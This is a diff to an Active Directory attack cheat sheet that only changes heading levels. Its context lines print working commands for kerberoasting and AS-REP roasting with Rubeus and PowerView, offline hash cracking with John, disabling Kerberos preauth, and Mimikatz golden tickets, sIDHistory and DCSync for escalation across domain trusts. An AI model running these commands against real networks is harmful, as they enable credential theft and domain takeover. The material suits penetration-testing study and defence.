@@ -34,7 +34,7 @@ C:> Get-DomainUser -SPN
 # Using AD Module
 C:> Get-ADUser -Filter {ServicePrincipalName ne ""$null ""} -Properties ServicePrincipalName
 ```
-##### Using `Rubeus.exe`
+#### Using `Rubeus.exe`
 ```powershell
 # Get kerberos stats
 C:> Rubeus.exe /stats
@@ -52,7 +52,7 @@ C:> Rubeus.exe kerberoast /outfile:hashes.txt
 # Crack with John. Adequate file before cracking
 C:> john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
 ```
-##### Using Mimikatz
+#### Using Mimikatz
 ```powershell
 C:> Add-Type -AssemblyNAme System.IdentityModel
 
@@ -68,7 +68,7 @@ C:> python.exe .\tgsrepcrack.py .\<wordlist>.txt .\<exported_file_from_mimikatz>
 ```
 ### Targeted Kerberoasting AS-REPs
 ---
-##### Enumerating accounts with Kerberos Preauth disabled
+#### Enumerating accounts with Kerberos Preauth disabled
 ```powershell
 # PowerView
 C:> Get-DomainUser -PreauthNotRequired -Verbose    
@@ -76,12 +76,12 @@ C:> Get-DomainUser -PreauthNotRequired -Verbose
 # AD Module
 C:> Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
 ```
-##### Disable Kerberos Preauth
+#### Disable Kerberos Preauth
 ```powershell
 C:> Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose
 C:> Get-DomainUser -PreauthNotRequired -Verbose    # Check
 ``` 
-##### ASREPRoast 
+#### ASREPRoast 
 ```powershell
 # Request Encrypted AS-REP for Offline Brute Force
 C:> Get-ASREPHash -UserName <user> -Verbose
@@ -203,7 +203,7 @@ C:> Rubeus.exe s4u /user:machine1$ /aes256:<machine1_hash> /msdsspn:http/<host> 
 ---
 ### Escalate Across Trusts
 ---
-##### Child to Parent using sIDHistory
+#### Child to Parent using sIDHistory
 ```powershell
 #`sIDHistory` (sids below) is a user attribute designed for scenarios where a user is moved from one domain to another. 
 # When a user's domain is changed, they get a new SID and the old SID is added to `sIDHistory`
@@ -231,7 +231,7 @@ C:> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<dom
 # Create a TGS using the created ticket
 C:> Rubeus.exe asktgs /ticket:trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:<target_domain_dc> /ptt
 ```
-##### Child to Parent Using krbtgt Hash
+#### Child to Parent Using krbtgt Hash
 ```powershell
 # With the krbtgt hash for child domain, create a inter realm TGT and inject in the process
 C:> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<child_Domain> /sid:<child_Domain_sid> 
@@ -242,13 +242,13 @@ C:> Invoke-Mimikatz -Command '"lsadump::dcsync /user:<parent_Domain>\krbtgt /dom
 ```
 
 
-##### Across Forest Using Trust Tickets
+#### Across Forest Using Trust Tickets
 
 ### Across Domain Trusts AD Certificate Services
 ---
 
-##### ESC1
+#### ESC1
 
-##### ESC3
-##### ESC6
+#### ESC3
+#### ESC6
 
